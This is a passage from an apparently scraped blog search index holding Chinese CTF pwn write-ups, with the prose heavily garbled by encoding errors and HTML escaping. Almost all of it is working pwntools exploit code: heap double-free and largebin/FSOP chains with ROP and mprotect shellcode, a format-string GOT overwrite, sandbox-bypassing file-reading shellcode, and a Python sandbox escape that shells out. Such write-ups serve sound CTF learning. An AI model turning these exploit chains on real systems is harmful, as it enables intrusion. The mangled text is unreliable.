heap = int(r.recv(7),16)
print(&amp;quot;heap = &amp;quot;,hex(heap))
add(0,0x500,b&#39;a&#39;)
add(1,0x20,b&#39;a&#39;)
delete(0)
add(2,0x48,b&#39;\x78&#39;)
add(3,0x48,(p64(0) + p64(0x51))*4)
add(4,0x78,b&#39;\x78&#39;)
add(5,0x68,b&#39;\x78&#39;)
add(10,0x48,b&#39;\x78&#39;)
delete(2)
delete(3)
delete(2)
fake_heap = heap - 134992
add(6,0x48,p64(fake_heap))
add(7,0x48,b&#39;a&#39;)
add(8,0x48,b&#39;a&#39;)
add(9,0x48,p64(0) + p64(0xf1))
delete(4)
delete(5)
add(11,0x78,(p64(0) + p64(0x41))*7)
add(12,0x58,b&#39;a&#39;)

add(4,0x38,b&#39;\x78&#39;)
add(5,0x38,b&#39;\x78&#39;)
add(10,0x38,b&#39;\x78&#39;)
delete(4)
delete(5)
delete(4)
fake_heap = heap - 134864
add(6,0x38,p64(fake_heap))
add(99,0x38,b&#39;a&#39;)
add(99,0x38,b&#39;a&#39;)
add(9,0x38,p64(0) + p64(0x71) + b&#39;\xdd\x55&#39;)
add(9,0x38,p64(0) + p64(0x71) + b&#39;\xdd\x55&#39;)
add(5,0x68,b&#39;\x78&#39;)
add(12,0x68,b&#39;\x00&#39;*51 + p64(0xfbad1800) + p64(0)*3 + b&#39;\x40&#39;)
libc = u64(r.recv(8)) - 3954240
print(&amp;quot;libc = &amp;quot;,hex(libc))
malloc_hook = libc + 3951376

add(4,0x68,b&#39;\x78&#39;)
add(5,0x68,b&#39;\x78&#39;)
add(10,0x68,b&#39;\x78&#39;)
delete(4)
delete(5)
delete(4)
add(6,0x68,p64(malloc_hook - 35))
add(99,0x68,b&#39;a&#39;)
add(99,0x68,b&#39;a&#39;)
#gdb.attach(r)
backdoor = 0x000000000400AAA
add(9,0x68,b&#39;a&#39;*19 + p64(backdoor))
cmd(1)
r.recvuntil(b&#39;idx???&#39;)
r.sendline(str(0).encode())
r.recvuntil(b&#39;size???&#39;)
r.sendline(str(0x100).encode())
r.interactive()
&lt;/code&gt;&lt;/pre&gt;
">èœ€é“å±±</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/qiang-wang-bei/"" data-c="
          &lt;h1 id=&#34;baby_heap&#34;&gt;baby_heap&lt;/h1&gt;
&lt;p&gt;ç¨‹åºæ˜¯2.35çš„libcï¼Œå¢åˆ æ”¹æŸ¥åŠŸèƒ½éƒ½æœ‰ï¼Œä½†æ˜¯åªèƒ½editä¸€æ¬¡&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1730625989781.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
åªèƒ½showä¸€æ¬¡&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1730626006840.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
åªèƒ½add6ä¸ªå †å—ï¼Œå¤§å°åœ¨0x500ä»¥ä¸Šï¼Œä¸‹æ ‡ä»1å¼€å§‹ï¼Œ&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1730625869786.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
æœ‰UAFï¼Œfreeåä¹Ÿèƒ½editå’Œshow&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1730625970233.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ç¬¬äº”ä¸ªé€‰é¡¹æ²¡å•¥ç”¨&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1730627002423.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ç¨‹åºè¿˜ç»™äº†ä¸€ä¸ªç±»ä¼¼äºåé—¨çš„é€‰é¡¹&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1730625650896.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ä½†æ˜¯æœ‰ä¸ªæ£€æŸ¥&lt;img src=&#34;https://l1u66.github.io//post-images/1730625694248.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
åŠ¨è°ƒçœ‹äº†ä¸‹èŒƒå›´ï¼Œå‘ç°èƒ½å†™çš„åœ°å€èŒƒå›´æ²¡å•¥æœ‰ç”¨çš„&lt;br&gt;
è¿˜å¼€äº†æ²™ç›’&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1730626306949.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;æ”»å‡»æ€è·¯&#34;&gt;æ”»å‡»æ€è·¯&lt;/h2&gt;
&lt;p&gt;2.35çš„libcæ²¡æœ‰äº†å„ç§hookï¼Œæ‰€ä»¥éœ€è¦æ‰“ioï¼Œç¨‹åºæ˜“é€šè¿‡exitå‡½æ•°é€€å‡ºï¼Œæ˜“è§¦å‘FSOPï¼Œé¦–å…ˆé€‰æ‹©æ‰“house of appleï¼Œæœ‰editå°±å¯ä»¥æ‰“largebin attackäº†ï¼Œéœ€è¦add5ä¸ªå †å—ï¼Œä¸­é—´å¯ä»¥showä¸€ä¸ªlargebiné‡Œçš„å †å—æ³„éœ²å‡ºlibcå’Œheapåœ°å€ï¼ŒåŠ«æŒ_IO_list_allï¼Œä½†æ˜¯æ­¤æ—¶_IO_list_allé‡Œçš„ä¼ªé€ çš„ioæ˜¯ç¬¬äºŒæ¬¡è¿›å…¥largebinçš„å †å—ï¼Œè€Œåªæœ‰ä¸€æ¬¡editæœºä¼šå·²ç»ç”¨åœ¨äº†largebin attackä¸Šï¼Œæ­¤æ—¶è¿˜æœ‰ä¸€æ¬¡addçš„æœºä¼šï¼ŒæŠŠæ­¤å †å—ç”³è¯·å‡ºæ¥å°±å¯ä»¥ä½¿_IO_list_allé‡Œçš„ä¼ªé€ çš„ioæŒ‡å‘ç¬¬ä¸€æ¬¡è¿›å…¥largebinçš„å †å—ï¼Œå°±å¯ä»¥è¢«æˆ‘ä»¬æ§åˆ¶ï¼Œä¼ªé€ ioæ—¶å‘ç°_IO_wfile_jumpsè¢«ç½®0äº†ï¼Œæ‰€ä»¥ç”¨_IO_wfile_jumps_mmapæ¥è°ƒç”¨_IO_wfile_overflowï¼Œç¨‹åºå¼€äº†æ²™ç›’ï¼Œç¦ç”¨äº†openå’Œopenatï¼Œä½¿ç”¨openat2ç»•è¿‡å³å¯ï¼Œä¸èƒ½ç›´æ¥æ‹¿åˆ°shellï¼Œæ‰€ä»¥ä¼ªé€ ioä½¿ç”¨svcudp_replyçš„gadgetsè°ƒç”¨mprotectä½¿å †åœ°å€å¯æ‰§è¡Œï¼Œå†™å…¥shellcodeæ‰§è¡Œå³å¯&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *

context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;)
# io = process(&#39;./pwn&#39;)
io = remote(&amp;quot;59.110.159.153&amp;quot;,35015)
e = ELF(&#39;./pwn&#39;)
lib = e.libc

def dbg():
    gdb.attach(io)


def cmd(choice):
    io.sendlineafter(&#39;Enter your choice: \n&#39;,str(choice).encode())

# å¤§å°åœ¨0x500ä»¥ä¸Š
# 6ä¸ª ä»1å¼€å§‹
def add(size):
    cmd(1)
    io.sendlineafter(&#39;Enter your commodity size \n&#39;,str(size).encode())

def edit(idx,payload):
    cmd(3)
    io.sendlineafter(&#39;Enter which to edit: \n&#39;,str(idx).encode())
    io.sendlineafter(&#39;Input the content \n&#39;,payload)

def delete(idx):
    cmd(2)
    io.sendlineafter(&#39;Enter which to delete: \n&#39;,str(idx).encode())
    
def show(idx):
    cmd(4)
    io.sendlineafter(&#39;Enter which to show: \n&#39;,str(idx).encode())

# ä»»æ„åœ°å€å†™
def magic(addr,con):
    cmd(6)
    io.sendlineafter(&#39;Input your target addr \n&#39;,p64(addr))
    io.send(p64(con))


add(0x528)#1
add(0x528)#2
add(0x518)#3
delete(1)
add(0x620)#4
show(1)

io.recvuntil(&amp;quot;The content is here \n&amp;quot;)
libc = u64(io.recv(8)) 
libc_base = libc - 0x21b110
print(&amp;quot;libc_base = &amp;quot;,hex(libc_base))
io.recv(8)
heap = u64(io.recv(8)) 
heap_base = heap - 0x950
print(&amp;quot;heap_base = &amp;quot;,hex(heap_base))

strerr = 0x21b860 + libc_base
fake_io_addr = 2384 + heap_base
lock = libc_base + 0x21ba60
_IO_list_all = libc_base + lib.sym[&#39;_IO_list_all&#39;]
io_wfile_jumps = libc_base + lib.sym[&#39;_IO_wfile_jumps&#39;] - 0xc0
magic_gadget = libc_base + 0x000000000016a06a
add_rsp_ret=libc_base+0x000000000003a889        #0x18
leave_ret = libc_base + 0x000000000004da83
&amp;quot;&amp;quot;&amp;quot;
&amp;lt;svcudp_reply+26&amp;gt;:    mov    rbp,QWORD PTR [rdi+0x48]
&amp;lt;svcudp_reply+30&amp;gt;:    mov    rax,QWORD PTR [rbp+0x18]
&amp;lt;svcudp_reply+34&amp;gt;:    lea    r13,[rbp+0x10]
&amp;lt;svcudp_reply+38&amp;gt;:    mov    DWORD PTR [rbp+0x10],0x0
&amp;lt;svcudp_reply+45&amp;gt;:    mov    rdi,r13
&amp;lt;svcudp_reply+48&amp;gt;:    call   QWORD PTR [rax+0x28]
&amp;quot;&amp;quot;&amp;quot;
pop_rdi = libc_base + 0x000000000002a3e5
pop_rsi = libc_base + 0x000000000002be51
pop_rdx_r12 = libc_base + 0x000000000011f2e7
mprotect = libc_base + 0x00000000011EAA0
# openat2 
sh=f&#39;&#39;&#39;
mov rax, 0x67616c66 /*  /flag   */
push rax
xor rdi, rdi
sub rdi, 100
mov rsi, rsp
push 0
push 0
push 0
mov rdx, rsp
mov r10, 0x18
push 437
pop rax
syscall

mov rdi,rax
mov rsi,rsp
push 0x100
pop rdx
xor eax,eax
syscall

xor rdi,rdi
inc rdi
mov rax,rdi
syscall
&#39;&#39;&#39;

rop=p64(pop_rdi)
rop+=p64(heap - 0x950)
rop+=p64(pop_rsi)
rop+=p64(0x1000)
rop+=p64(pop_rdx_r12)
rop+=p64(7)
rop+=p64(0)
rop+=p64(mprotect)
rop+=p64(fake_io_addr + 0x370)

fake_io_file = p64(0)*2 + p64(1) + p64(_IO_list_all - 0x20)
fake_io_file = fake_io_file.ljust(
    0x48 - 0x10, b&#39;\0&#39;) + p64(fake_io_addr + 0x300) + p64(leave_ret)  # rbp
fake_io_file = fake_io_file.ljust(
    0xa0 - 0x10, b&#39;\0&#39;) + p64(fake_io_addr + 0x100)  # _wide_data (A)
fake_io_file = fake_io_file.ljust(
    0xc0 - 0x10, b&#39;\0&#39;) + p64(0xffffffffffffffff)  # _mode
fake_io_file = fake_io_file.ljust(
    0xd8 - 0x10, b&#39;\0&#39;) + p64(io_wfile_jumps)  # vtable
fake_io_file = fake_io_file.ljust(
    0x100 - 0x10 + 0xe0, b&#39;\0&#39;) + p64(fake_io_addr + 0x200)  # B
fake_io_file = fake_io_file.ljust(
    0x200 - 0x10, b&#39;\0&#39;) + p64(0)*13 + p64(magic_gadget)  # C
fake_io_file = fake_io_file.ljust(
    0x300 - 0x10, b&#39;\0&#39;) + p64(0) + p64(add_rsp_ret)
fake_io_file = fake_io_file.ljust(
    0x318 - 0x10, b&#39;\0&#39;) + p64(fake_io_addr + 0x28) + p64(0) + rop  # rax
fake_io_file += asm(sh)

edit(1,fake_io_file)
delete(3)
add(0x620)#5
add(0x518)#6
print(&amp;quot;_IO_list_all = &amp;quot;,hex(_IO_list_all))
print(&amp;quot;fake_io_addr = &amp;quot;,hex(fake_io_addr))
print(sh)
# gdb.attach(io)
cmd(4)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">å¼ºç½‘æ¯</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/yuan-lu-bei-2024/"" data-c="
          &lt;p&gt;æµ…æµ…æ‹¿ä¸ªäºŒç­‰å¥–ğŸ˜‹&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1729873236149.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;round-1&#34;&gt;Round 1&lt;/h1&gt;
&lt;h2 id=&#34;round-1-canary_orw&#34;&gt;[Round 1] canary_orw&lt;/h2&gt;
&lt;p&gt;idaæ‰“å¼€ç¨‹åºå‘ç°æœ‰ä¸ªhintå‡½æ•°ï¼Œé‡Œé¢æœ‰ä¸ªæ±‡ç¼–jmp rspï¼Œå¹¶ä¸”å‘ç°æ ˆå¯æ‰§è¡Œï¼Œæ‰€ä»¥å¾—çŸ¥æ‰“shellcodeï¼Œå¹¶ä¸”å¼€äº†æ²™ç›’ï¼Œæ²¡æœ‰ä»»ä½•è¿‡æ»¤&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import LibcSearcher
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;)

p = process(&#39;./canary&#39;)
elf = ELF(&#39;./canary&#39;)

vuln = 0x000000000400820
jmp_rsp = 0x00000000040081B
# xor eax,eax 
# add rdx,0x60
# syscall
payload = p64(jmp_rsp) + b&amp;quot;\x31\xc0\x31\xff\x48\x83\xc2\x60\x0f\x05&amp;quot;
# gdb.attach(p)
p.sendafter(&amp;quot;Say some old spells to start the journey\n&amp;quot;, payload)
shellcode=&#39;&#39;&#39;
	xor rax, rax   #xor rax,raxæ˜¯å¯¹raxçš„æ¸…é›¶è¿ç®—æ“ä½œ
	xor rdi, rdi   #æ¸…ç©ºrdiå¯„å­˜å™¨çš„å€¼
	xor rsi, rsi   #æ¸…ç©ºrsiå¯„å­˜å™¨çš„å€¼
	xor rdx, rdx
	mov rax, 2      #openè°ƒç”¨å·ä¸º2
	mov rdi, 0x67616c662f2e   #ä¸ºgalf/.ä¸º./flagçš„ç›¸å0x67616c662f2eä¸º/flagçš„ASCIIç çš„åå…­è¿›åˆ¶
	push rdi
	mov rdi, rsp
    xor rsi, rsi
	syscall   #ç³»ç»Ÿè°ƒç”¨å‰ï¼Œlinuxåœ¨eaxå¯„å­˜å™¨é‡Œå†™å…¥å­åŠŸèƒ½å·ï¼Œæ–­æ­¢å¤„ç†ç¨‹åºæ ¹æ®eaxå¯„å­˜å™¨çš„å€¼æ¥åˆ¤æ–­ç”¨æˆ·è¿›ç¨‹ç”³è¯·å“ª	ç±»ç³»ç»Ÿè°ƒç”¨ã€‚
	mov rdx, 0x100   #sys_read(3,file,0x100)
	mov rsi, rdi
	mov rdi, rax
	mov rax, 0      #readè°ƒç”¨å·ä¸º0,0ä¸ºæ–‡ä»¶æè¿°ç¬¦ï¼Œå³å¤–éƒ¨è¾“å…¥ï¼Œä¾‹å¦‚é”®ç›˜
	syscall
	mov rdi, 1      #sys_write(1,file,0x30)
	mov rax, 1      #writeè°ƒç”¨å·ä¸º1,1ä¸ºæ–‡ä»¶æè¿°ç¬¦ï¼ŒæŒ‡çš„æ˜¯å±å¹•
	syscall
&#39;&#39;&#39;
shellcode = asm(shellcode)
print(shellcode)
pause()
p.send(b&#39;./flag\x00\x00&#39; + shellcode)
p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;round-1-ezfmt&#34;&gt;[Round 1] ezfmt&lt;/h2&gt;
&lt;p&gt;ä¸€æ¬¡æ ˆæº¢å‡ºå¤–åŠ ä¸€æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œé€šè¿‡æ ˆæº¢å‡ºå¯ä»¥è§¦å‘å¤šæ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²,æœ¬æ¥æƒ³æ”¹printfçš„gotè¡¨ï¼Œä½†æ˜¯readçš„å­—èŠ‚æ•°è²Œä¼¼ä¸å¤ªå¤Ÿï¼Œæƒ³åˆ°æœ‰one_gadgetsï¼Œç¬¬äºŒä¸ªå³å¯æ‹¿åˆ°shell&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&amp;quot;./pwn&amp;quot;)
elf = ELF(&amp;quot;./pwn&amp;quot;)

bss = 0x000000000404060 + 0x700
main = 0x00000000040120D
printf = 0x000000000404020

# gdb.attach(p)
payload = b&amp;quot;%13$paaa&amp;quot;
payload = payload.ljust(32,b&#39;a&#39;)
payload += p64(bss) + p64(main)
p.sendafter(&amp;quot;welcome to YLCTF\n&amp;quot;,payload)

p.recvuntil(&amp;quot;0x&amp;quot;)
__libc_start_main = int(p.recv(12),16) - 243
print(&amp;quot;__libc_start_main = &amp;quot;,hex(__libc_start_main))
base = __libc_start_main - 147344
print(&amp;quot;base = &amp;quot;,hex(base))
sys = base + 0x000000000052290
print(&amp;quot;sys = &amp;quot;,hex(sys))
one = [0xe3afe, 0xe3b01, 0xe3b04]

x1 = sys &amp;amp; 0xffff
payload = b&#39;%&#39; + str(x1).encode(&amp;quot;utf-8&amp;quot;) + b&#39;c&#39; + b&#39;%7$hn&#39;
x2 = (sys &amp;gt;&amp;gt; 8) &amp;amp; 0xff
payload += b&#39;%&#39; + str(0x100 + x2 - x1).encode(&amp;quot;utf-8&amp;quot;) + b&#39;c&#39; + b&#39;%8$hhn&#39;
payload = payload.ljust(0x20,b&#39;\x00&#39;)
payload += p64(printf) + p64(printf + 4)
pause()
p.sendline(b&#39;a&#39;*32 + p64(0) + p64(base + one[1]))

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;round-1-ezheap&#34;&gt;[Round 1] ezheap&lt;/h2&gt;
&lt;h3 id=&#34;éé¢„æœŸ&#34;&gt;éé¢„æœŸ&lt;/h3&gt;
&lt;p&gt;è¿™é¢˜ä¹Ÿæ˜¯æŠ½è±¡ï¼Œç”¨ç½‘ç«™å»æ¥å—è„šæœ¬æœ¬åœ°è¿è¡Œå‡ºç»“æœï¼Œè¿˜å†™æ˜äº†&amp;lt;è¯·å‹¿å¸¦æœ‰oså’Œsubprocess&amp;gt;ï¼Œç»è¿‡print(1)æµ‹è¯•åå‘ç°ç›´æ¥å›æ˜¾ï¼Œå°±æƒ³åˆ°pythonæ²™ç®±é€ƒé€¸ï¼Œæ‹·æ‰“gptå¾—åˆ°&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1729872506628.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;æµ‹è¯•åä¸è¡Œï¼Œè§‰å¾—åº”è¯¥æ˜¯å§oså­—ç¬¦è¿‡æ»¤æ‰äº†ï¼Œç›´æ¥ç©ºå­—ç¬¦ç»•è¿‡&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sys = __import__(&#39;o&#39;&#39;s&#39;)
sys.system(&#39;cat flag&#39;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ç›´æ¥æ‹¿åˆ°flagäº†......&lt;/p&gt;
&lt;h3 id=&#34;é¢„æœŸè§£&#34;&gt;é¢„æœŸè§£&lt;/h3&gt;
&lt;p&gt;è¯¥ç¨‹åºæœ‰ä¸€æ¬¡ä»»æ„åœ°å€å†™ä¸€å¤§æ•°çš„æœºä¼šï¼Œå¯ä»¥è¦†ç›–mpæ‰©å¤§tcachebinçš„èŒƒå›´ï¼Œè¿™ä¸ªæŒ‡é’ˆä¼šä¼šæŒ‰ç…§åœ°å€é¡ºå»¶åˆ°é«˜åœ°å€å¤„çš„chunkï¼Œä¼šè¢«æˆ‘ä»¬æ§åˆ¶ï¼Œä»è€Œè®©æˆ‘ä»¬æ‹¥æœ‰ä»»æ„åœ°å€å†™çš„èƒ½åŠ›ï¼Œä»è€Œè·å–shellã€‚&lt;/p&gt;
&lt;h4 id=&#34;å¯»æ‰¾mp_&#34;&gt;å¯»æ‰¾mp_&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;p mp_&lt;/code&gt;æ‰“å°å‡ºmp_ç»“æ„ä½“ï¼Œè¦†ç›–åç§»0x50çš„tcache_binså³å¯&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
from pwn import*
from ctypes import *
from struct import *

io = process(&amp;quot;./pwn&amp;quot;)
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;)

libc = ELF(&amp;quot;./libc-2.31.so&amp;quot;)

elf = ELF(&amp;quot;./pwn&amp;quot;)
menu=&amp;quot;Input your choice&amp;quot;
def add(size,cont):
    io.sendlineafter(menu,str(1))
    io.sendlineafter(&amp;quot;Size :&amp;quot;,str(size))
    io.sendafter(&amp;quot;Content :&amp;quot;,cont)

def delete(idx):
    io.sendlineafter(menu,str(2))
    io.sendlineafter(&amp;quot;Index :&amp;quot;,str(idx))

def edit(addr):
    io.sendlineafter(menu,str(3))
    io.sendafter(&amp;quot;content :&amp;quot;,addr)

def show(idx):
    io.sendlineafter(menu,str(4))
    io.sendlineafter(&amp;quot;Index :&amp;quot;,str(idx))

add(0x500,b&#39;a&#39;) 
add(0x500,b&#39;/bin/sh\x00&#39;) 
add(0x500,b&#39;a&#39;) 
add(0x500,b&#39;a&#39;) 
add(0x100,b&#39;a&#39;) 
delete(2)
add(0x500,b&#39;a&#39;*8) 
show(5)
io.recvuntil(b&#39;a&#39;*8)
libcbase=u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))-0x1ecbe0
print(hex(libcbase))
free_hook= libcbase +libc.sym[&#39;__free_hook&#39;]
system=libcbase+libc.sym[&#39;system&#39;]
#gdb.attach(io)
mp=libcbase+0x1EC280+0x50
print(hex(free_hook))
edit(p64(mp))
delete(3)
delete(0)
add(0x500,p64(0)*13+p64(free_hook)) 
#gdb.attach(io)
add(0x500,p64(system))

delete(1)


io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;round-1-ezorw&#34;&gt;[Round 1] ezorw&lt;/h2&gt;
&lt;p&gt;å°±æ˜¯å¼€äº†æ²™ç›’çš„shellcode&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1729872756053.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
éšä¾¿ç»•ä¸€ä¸‹&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&amp;quot;./pwn&amp;quot;)
elf = ELF(&amp;quot;./pwn&amp;quot;)
libc = elf.libc

payload = asm(shellcraft.openat(0xffffff9c,b&amp;quot;flag&amp;quot;,0))	
#payload = asm(shellcraft.openat(-100,b&amp;quot;flag&amp;quot;,0))	
#-100 AT_FDCWD è¡¨ç¤ºå½“å‰ç›®å½•
payload += asm(shellcraft.pread(3,0x114514000,0x100,0))	
payload += asm(shellcraft.sendfile(1,3,0,0x100))

p.sendafter(&amp;quot;welcome to YLCTF orw~\n&amp;quot;,payload)
p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;round-1-ezstack&#34;&gt;[Round 1] ezstack&lt;/h2&gt;
&lt;p&gt;é€šè¿‡æ ˆæº¢å‡ºå¯ä»¥ä½¿ç¨‹åºè¿è¡Œåˆ°vulnå‡½æ•°ï¼Œå¯¹systemå‡½æ•°çš„å‘½ä»¤ç¦ç”¨äº†s,h,c,få­—ç¬¦ï¼Œç›´æ¥/???/?at *lagèƒ½æ‹¿åˆ°flag&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)
p = process(&amp;quot;./pwn&amp;quot;)
#gdb.attach(p)
vuln = 0x00000000040127A
p.sendafter(&amp;quot;good stack\n&amp;quot;,b&#39;a&#39;*0x30 + p64(0) + p64(vuln))
p.sendafter(&amp;quot;input your command\n&amp;quot;,b&amp;quot;/???/?at *lag&amp;quot;)
p.interactive()

&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;round-1-giaopwn&#34;&gt;&lt;strong&gt;[Round 1] giaopwn&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;ç­¾åˆ°&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)
p = process(&amp;quot;./pwn&amp;quot;)
#gdb.attach(p)
system = 0x0000000004006D2
cmd = 0x000000000601048
rdi = 0x0000000000400743
ret = rdi + 1
p.sendafter(&amp;quot;welcome to YLCTF\n&amp;quot;,b&#39;a&#39;*32 + p64(0) + p64(rdi) + p64(cmd) + p64(system))

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;round-1-msg_bot&#34;&gt;&lt;strong&gt;[Round 1] msg_bot&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;æ‰“å¼€ç¨‹åºå‘ç°æ˜¯ä¸€é“protobufçš„pwné¢˜ï¼Œæ‰‹åŠ¨åˆ†æå‡ºprotoæ–‡ä»¶&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;syntax=&amp;quot;proto3&amp;quot;; //proto version 2 or 3

message msgbot{
    int64 msgid = 1;
    int64 msgsize = 2;
    bytes msgcontent = 3;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åˆ©ç”¨&lt;code&gt;protoc bot.proto --python_out=./&lt;/code&gt;å‘½ä»¤ç”Ÿæˆpythonè¯­è¨€çš„ä»£ç ï¼Œå¾—åˆ°ä¸€ä¸ªpythonæ–‡ä»¶ï¼Œå¯ä»¥åœ¨expä¸­å¯¼å…¥ï¼Œæ„å»ºç›¸åº”çš„protobufåŒ…ï¼Œåˆ†æç¨‹åºå‘ç°å¦‚æœè¦æƒ³æ‰§è¡Œåˆ°shellcodeï¼Œéœ€è¦æ»¡è¶³msgid=3235839725ï¼Œmsgsize=4027448014ï¼Œé€šè¿‡è°ƒè¯•å‘ç°è¾“å…¥çš„shellcodeæ¯ä¸ªå­—èŠ‚éœ€è¦åœ¨0x1få’Œ0x7fä¹‹é—´ï¼Œéƒ½éœ€è¦æ˜¯å¯è§å­—ç¬¦ï¼Œè€Œä¸”è¿˜é™åˆ¶äº†shellcodeçš„é•¿åº¦ï¼Œä½†æ˜¯é•¿åº¦æ”¾çš„éå¸¸å¤šï¼Œä¸ç”¨æ€ä¹ˆç®¡ï¼Œç›´æ¥ç”¨alpha3ç”Ÿæˆå³å¯ï¼Œæ„é€ ä¸€ä¸ªshellcodeçš„å†æ¬¡è¯»å…¥ï¼Œåé¢è¯»å…¥çš„shellcodeçš„é™åˆ¶å°±æ²¡æœ‰äº†ï¼Œä½†æ˜¯ç¨‹åºè¿˜å¼€äº†æ²™ç›’&lt;img src=&#34;C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1728627907038.png&#34; alt=&#34;1728627907038&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;æ²¡åŠæ³•ä½¿ç”¨æ‰“å¼€æ–‡ä»¶çš„æ“ä½œï¼Œä½†æ˜¯å…è®¸äº†ä¸€ä¸ªfstatçš„å‡½æ•°ï¼Œå¯ä»¥çŸ¥é“æ˜¯è¦åˆ©ç”¨retfqæŠŠç¨‹åºè½¬åŒ–ä¸º32ä½ç³»ç»Ÿï¼Œæ­¤æ—¶çš„openå‡½æ•°çš„ç³»ç»Ÿè°ƒç”¨å·å°±æ˜¯5ï¼Œå°±å¯ä»¥æ‰“å¼€æ–‡ä»¶äº†ï¼Œç„¶åå†è½¬åŒ–åˆ°64ä½ç³»ç»Ÿè°ƒç”¨readå’Œwriteå‡½æ•°å³å¯æ‰“å°å‡ºflagï¼Œå…·ä½“è½¬åŒ–çš„ç»†èŠ‚æ…¢æ…¢è°ƒè¯•å°±å¯ä»¥&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
import bot_pb2
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)
# p = process(&amp;quot;./msg_bot&amp;quot;)
p = remote(&amp;quot;challenge.yuanloo.com&amp;quot;,29472)
elf = ELF(&amp;quot;./msg_bot&amp;quot;)

# re_read
# from pwn import *

# payload = shellcraft.amd64.read(0, &amp;quot;rdi&amp;quot;, 0x6666)
# f = open(&#39;mmap_read&#39;, &#39;wb&#39;)
# f.write(asm(payload, arch = &#39;amd64&#39;, os = &#39;linux&#39;))
# f.close()

data = bot_pb2.msgbot()
data.msgid = 3235839725
data.msgsize = 4027448014
data.msgcontent = b&#39;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M1L3a144z5o108K15380S3E0W0V070N01&#39;
data = data.SerializeToString()
# gdb.attach(p,&amp;quot;b *$rebase(0x0000000000017C9)&amp;quot;)
p.sendafter(&amp;quot;botmsg: &amp;quot;,data)

re_read = asm(&#39;&#39;&#39;
              push 0x23
              add rcx,5
              push rcx
              retfq
              mov rsp,rcx
&#39;&#39;&#39;)

# sc = shellcraft.i386.open(&amp;quot;/flag&amp;quot;)
sc = b&#39;h\x01\x01\x01\x01\x814$`f\x01\x01h./fl\xb8\x05\x00\x00\x00\x89\xe31\xc9\xcd\x80&#39;
re_read += sc

re_read1 = asm(&#39;&#39;&#39;
               push 0x33
               add rsi,0x7a
               push rsi
               retfq
